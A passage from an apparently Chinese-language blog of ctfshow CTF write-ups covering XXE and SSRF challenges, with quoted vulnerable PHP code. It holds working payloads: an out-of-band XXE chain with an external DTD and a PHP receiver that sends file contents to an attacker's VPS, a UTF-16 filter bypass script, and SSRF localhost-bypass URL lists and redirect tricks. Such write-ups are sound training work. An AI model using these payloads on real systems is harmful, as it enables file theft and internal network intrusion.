2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜ç›¸è¾ƒä¸Šé¢˜è€Œè¨€ï¼Œæ²¡æœ‰äº†å›æ˜¾   å°±æ˜¯<code>echo</code>è¾“å‡º</p><p>æ‰€ä»¥æˆ‘ä»¬å°±å¾—è¿›è¡Œå¤–å¸¦äº†  å¾—è‡ªå·±å‡†å¤‡ä¸€ä¸ªvps</p><p><strong>ç¬¬ä¸€æ­¥</strong></p><p>å…ˆåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå»ºä¸€ä¸ªç½‘ç«™ï¼Œç„¶åç»™ä¸€ä¸ªç«¯å£å·</p><p><img src="../images/image-20230123225626535.png" alt="image-20230123225626535"></p><p><strong>ç¬¬äºŒæ­¥</strong></p><p>å°±å¼€å§‹åœ¨ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹å†™æ‰€éœ€è¦çš„æ–‡ä»¶</p><p>å…ˆå†™ä¸€ä¸ª<strong>pd.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://vsp:ç«¯å£å·/xxe.php?q=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸ªxxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å†™ä¸€ä¸ªflag.txtç”¨æ¥å­˜åå¼¹å›æ¥çš„flag</p><p><img src="../images/image-20230123230041340.png" alt="image-20230123230041340"></p><p>å°±æ˜¯å¯ä»¥å…ˆæ‹¿è‡ªå·±çš„vpså»çœ‹ä¸€ä¸‹èƒ½ä¸èƒ½è®¿é—®è¿™ä¸‰ä¸ªæ–‡ä»¶ï¼Œå¦‚æœèƒ½è®¿é—®çš„è¯å°±è¿›è¡Œpostå‘åŒ…ã€‚</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps:ç«¯å£å·/pd.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">] &gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230123230256902.png" alt="image-20230123230256902"></p><p>å¦‚æœæˆåŠŸçš„è¯ï¼Œå°±ä¼šåœ¨è‡ªå·±çš„ç½‘ç«™æ ¹ç›®å½•çœ‹åˆ°flag.</p><p><img src="../images/image-20230123230333502.png" alt="image-20230123230333502"></p><p>ä¸Šé¢çš„æ–¹æ³•æ˜¯é€šæ€æ–¹æ³•  â€”-&gt;   é¢˜ç›®æŠŠxmlç»™è¿‡æ»¤æ‰äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯æŠŠxmlå’Œhttpéƒ½ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨pythonè¿›è¡Œç¼–ç å‘åŒ…</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxx&#x27;</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">] &gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">requests.post(url ,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å› ä¸ºxmlæ”¯æŒutf-16ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œutf-16è¿›è¡Œç¼–ç </p><h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230123231807557.png" alt="image-20230123231807557"></p><p>ä¸€ä¸ªxxeçš„ç™»å½•ï¼Œå°è¯•ä¸€ä¸‹å¼±å£ä»¤ç™»å½•ï¼Œadmin/admin   ç™»å½•æˆåŠŸï¼Œæ²¡æœ‰æ˜¾ç¤ºä»€ä¹ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒæŠ“åŒ…æŸ¥çœ‹ã€‚</p><p><img src="../images/image-20230123231949046.png" alt="image-20230123231949046"></p><p>ç„¶åå°±å¯ä»¥è¿›è¡Œxxeæ³¨å…¥äº†ï¼Œè¿™ç§ç±»å‹çš„é¢˜ç›®æ˜¯æœ€ç»å…¸çš„ï¼Œç½‘ä¸Šæœ‰ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p><p><img src="../images/image-20230123232139774.png" alt="image-20230123232139774"></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªshowè®²çš„xxeç±»å‹æ¯”è¾ƒå°‘ï¼Œæƒ³çœ‹æ›´è¯¦ç»†çš„å¯ä»¥å»çœ‹æ–‡ç« å¼€å¤´ç»™çš„é‚£ä¸¤ç¯‡æ–‡ç« </p><p>libxml2.9.0ä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´XXEæ¼æ´é€æ¸æ¶ˆäº¡  PHPç‰ˆæœ¬å¹¶ä¸å½±å“XXEåˆ©ç”¨ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> xxe ctfshow åˆ·é¢˜è®°å½•xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-SSRF åˆ·é¢˜è®°å½•</title>
      <link href="/posts/f917f043.html"/>
      <url>/posts/f917f043.html</url>
      
        <content type="html"><![CDATA[<p>å¯ä»¥é€šè¿‡è¿™ç¯‡æ–‡ç« æ¥äº†è§£ä¸€ä¸‹å•¥æ˜¯SSRF  â€”â€”&gt;   <a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p><p>(è§‰å¾—å†™çš„ä¸å¥½çš„è¯å¯ä»¥è‡ªå·±å»ç½‘ä¸Šæœï¼Œç½‘ä¸ŠæŒºå¤šäººå†™çš„)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»¥ä¸‹å†…å®¹æ‘˜è‡ªè¿™ç¯‡æ–‡ç«  https://blog.csdn.net/q20010619/article/details/120536552</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSRFåŸºç¡€</span><br><span class="line">SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç›¸å…³å‡½æ•°å’Œç±»</span><br><span class="line"></span><br><span class="line">file_get_contents()ï¼šå°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</span><br><span class="line">readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹</span><br><span class="line">fsockopen()ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥</span><br><span class="line">curl_exec()ï¼šåˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt()ï¼Œcurl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨</span><br><span class="line">fopen()ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ–‡ä»¶æˆ–è€… URL</span><br><span class="line">PHPåŸç”Ÿç±»SoapClientåœ¨è§¦å‘ååºåˆ—åŒ–æ—¶å¯å¯¼è‡´SSRF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç›¸å…³åè®®</span><br><span class="line"></span><br><span class="line">fileåè®®ï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">dictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</span><br><span class="line">gopheråè®®ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell</span><br><span class="line">http/såè®®ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨æ–¹å¼</span><br><span class="line"></span><br><span class="line">1.è®©æœåŠ¡ç«¯å»è®¿é—®ç›¸åº”çš„ç½‘å€</span><br><span class="line"></span><br><span class="line">2.è®©æœåŠ¡ç«¯å»è®¿é—®è‡ªå·±æ‰€å¤„å†…ç½‘çš„ä¸€äº›æŒ‡çº¹æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åº”çš„cms</span><br><span class="line"></span><br><span class="line">3.å¯ä»¥ä½¿ç”¨fileã€dictã€gopher[11]ã€ftpåè®®è¿›è¡Œè¯·æ±‚è®¿é—®ç›¸åº”çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">4.æ”»å‡»å†…ç½‘webåº”ç”¨ï¼ˆå¯ä»¥å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…&#123;payload&#125;ï¼‰</span><br><span class="line"></span><br><span class="line">5.æ”»å‡»å†…ç½‘åº”ç”¨ç¨‹åºï¼ˆåˆ©ç”¨è·¨åè®®é€šä¿¡æŠ€æœ¯ï¼‰</span><br><span class="line"></span><br><span class="line">6.åˆ¤æ–­å†…ç½‘ä¸»æœºæ˜¯å¦å­˜æ´»ï¼šæ–¹æ³•æ˜¯è®¿é—®çœ‹æ˜¯å¦æœ‰ç«¯å£å¼€æ”¾</span><br><span class="line"></span><br><span class="line">7.DoSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥keep-alive alwaysï¼‰</span><br></pre></td></tr></table></figure><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120160711692.png" alt="image-20230120160711692"></p><p><strong>ssrfé¢˜çš„å…³é”®è¯å°±æ˜¯curl</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*# curl_init â€” åˆå§‹åŒ– cURL ä¼šè¯*    </span><br><span class="line">*# curl_setopt â€” è®¾ç½®ä¸€ä¸ªcURLä¼ è¾“é€‰é¡¹* </span><br><span class="line">*# curl_exec â€” æ‰§è¡Œ cURL ä¼šè¯* </span><br><span class="line">*# curl_close â€” å…³é—­ cURL ä¼šè¯*</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥å‘ç°å­˜åœ¨flag.phpè¿™ä¸ªæ–‡ä»¶</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post: url=http://127.0.0.1/flag.php</span><br><span class="line">æˆ–è€…ä½¿ç”¨ file ä¼ªåè®®å»è¯»å–æ–‡ä»¶</span><br><span class="line">post: url=file:///var/www/html/flag.php æŸ¥çœ‹æºç </span><br></pre></td></tr></table></figure><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120161950493.png" alt="image-20230120161950493"></p><p>è¿‡æ»¤äº†ä¸€ä¸‹ï¼Œä½†æ˜¯ç­‰äºæ²¡è¿‡æ»¤ã€‚ã€‚ã€‚ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=http://localhost/flag.php</span><br><span class="line">url=http://127.0.0.1/flag.php</span><br><span class="line">url=http://127.0.1/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">(è½¬è¿›åˆ¶çš„æ–¹æ³•ä¹Ÿå¯ä»¥  ---&gt; 2è¿›åˆ¶  16è¿›åˆ¶  8è¿›åˆ¶éƒ½å¯ä»¥)</span><br></pre></td></tr></table></figure><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120162659628.png" alt="image-20230120162659628"></p><p>å¢åŠ äº†æ–°è¿‡æ»¤</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">åè¿›åˆ¶æ•´æ•°ï¼šurl=http://2130706433/flag.php</span><br><span class="line">åå…­è¿›åˆ¶ï¼šurl=http://0x7F.0.0.1/flag.php</span><br><span class="line">å…«è¿›åˆ¶ï¼šurl=http://0177.0.0.1/flag.php</span><br><span class="line">åå…­è¿›åˆ¶æ•´æ•°ï¼šurl=http://0x7F000001/flag.php</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">ç¼ºçœæ¨¡å¼ï¼š127.0.0.1å†™æˆ127.1</span><br><span class="line">CIDRï¼šurl=http://127.127.127.127/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120163438468.png" alt="image-20230120163438468"></p><p>æŠŠ1  0  éƒ½ç»™è¿‡æ»¤æ‰äº†ã€‚</p><p><strong>è§£æ³•ä¸€</strong></p><p>ä½¿ç”¨ <code>http://sudo.cc</code>è¿™ä¸ªåŸŸåå°±æ˜¯æŒ‡å‘127.0.0.1</p><p><strong>è§£æ³•äºŒ</strong></p><p>302è·³è½¬  â€”-&gt;  é¢˜ç›®å‡ºç°<strong>parse_url</strong>æ—¶å¯ä»¥ç”¨    (<strong>æˆ‘çŒœçš„</strong>)   ä»…ä¾›å‚è€ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨phpä¸­ï¼Œ302ä¸æ˜¯é”™è¯¯ï¼Œè€Œæ˜¯HTTPå“åº”çŠ¶æ€ç ï¼Œæ„æ€ä¸ºâ€œä¸´æ—¶é‡å®šå‘â€ï¼Œè¡¨ç¤ºè¢«è®¿é—®é¡µé¢å› ä¸ºå„ç§éœ€è¦è¢«ä¸´æ—¶è·³è½¬åˆ°å…¶ä»–é¡µé¢ï¼›å¯åˆ©ç”¨header()æ¥å®ç°302è·³è½¬ï¼Œè¯­æ³•â€œheader(&#x27;Location: è·³è½¬url&#x27;,true,302)â€ã€‚</span><br></pre></td></tr></table></figure><p>å°±æ˜¯åœ¨è‡ªå·±çš„vpsä¸Šæ­å»ºä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location:http://127.0.0.1/flag.php&quot;);</span><br></pre></td></tr></table></figure><p><strong>è§£æ³•ä¸‰</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è‡ªå·±å»ceye.ioæ³¨å†Œç»‘å®š127.0.0.1ç„¶åè®°å¾—å‰é¢åŠ r</span><br><span class="line"></span><br><span class="line">url=http://r.xxxzc8.ceye.io/flag.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230120164945293.png" alt="image-20230120164945293"></p><p>å¦‚æœè‡ªå·±çš„Identifieré‡Œæœ‰0æˆ–è€…1çš„è¯å°±ç”¨ä¸äº†äº†ã€‚</p><p><img src="../images/image-20230120165033153.png" alt="image-20230120165033153"></p><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120165540423.png" alt="image-20230120165540423"></p><p>è¿™é‡Œçš„è¯é•¿åº¦ç»™äº†é™åˆ¶ï¼Œå°±æ˜¯é•¿åº¦å°äº5</p><p>è¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹<code>parse_url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†</span><br><span class="line">æ•°ç»„ä¸­å¯èƒ½çš„é”®æœ‰ä»¥ä¸‹å‡ ç§ï¼š</span><br><span class="line">scheme - å¦‚ http</span><br><span class="line">host</span><br><span class="line">port</span><br><span class="line">user</span><br><span class="line">pass</span><br><span class="line">path</span><br><span class="line">query - åœ¨é—®å· ? ä¹‹å</span><br><span class="line">fragment - åœ¨æ•£åˆ—ç¬¦å· # ä¹‹å</span><br><span class="line">    </span><br><span class="line"># ä¾‹ï¼š</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;    </span><br><span class="line"># è¾“å‡º</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120165847080.png" alt="image-20230120165847080"></p><p>è¿™é‡Œçš„è¯æ˜¯é™åˆ¶é•¿åº¦åˆ°3ä½äº†</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 